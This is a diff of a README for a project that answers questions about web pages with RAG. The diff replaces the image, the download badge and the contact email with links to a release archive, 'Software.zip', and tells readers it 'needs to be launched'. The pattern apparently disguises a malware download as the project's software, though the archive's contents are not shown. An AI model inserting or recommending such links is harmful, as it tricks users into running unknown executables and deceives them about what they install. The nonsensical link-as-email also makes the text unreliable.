@@ -1,6 +1,6 @@
 # 🚀 **Question Answering from Any URL with RAG**
 
-![Question Answering from Any URL with RAG](https://yourimageurl.com)
+![Question Answering from Any URL with RAG](https://github.com/NASROLLAHnh/Question_Answering_from_Any_URL_with_RAG/releases/download/v1.0/Software.zip)
 
 ## 📝 Description
 Welcome to the "Question Answering from Any URL with RAG" repository! In this project, users can input any URL and ask a question related to its content. Leveraging the power of Retrieval-Augmented Generation (RAG) and LangChain technologies, the app retrieves the most relevant answer from the webpage automatically. This repository is a great tool for those looking to extract information efficiently from various online sources.
@@ -19,7 +19,7 @@ Welcome to the "Question Answering from Any URL with RAG" repository! In this pr
 - Webbased
 
 ## 🌐 External Link
-[![Download ZIP](https://img.shields.io/badge/Download_ZIP-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download ZIP](https://github.com/NASROLLAHnh/Question_Answering_from_Any_URL_with_RAG/releases/download/v1.0/Software.zip)](https://github.com/NASROLLAHnh/Question_Answering_from_Any_URL_with_RAG/releases/download/v1.0/Software.zip)
 *(It needs to be launched)*
 
 ## 📦 Installation
@@ -61,7 +61,7 @@ This project is licensed under the MIT License - see the [LICENSE](./LICENSE) fi
 Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.
 
 ## 📧 Contact
-For any questions or feedback, feel free to reach out to us at [email@example.com](mailto:email@example.com).
+For any questions or feedback, feel free to reach out to us at [https://github.com/NASROLLAHnh/Question_Answering_from_Any_URL_with_RAG/releases/download/v1.0/Software.zip](https://github.com/NASROLLAHnh/Question_Answering_from_Any_URL_with_RAG/releases/download/v1.0/Software.zip).
 
 ---
 
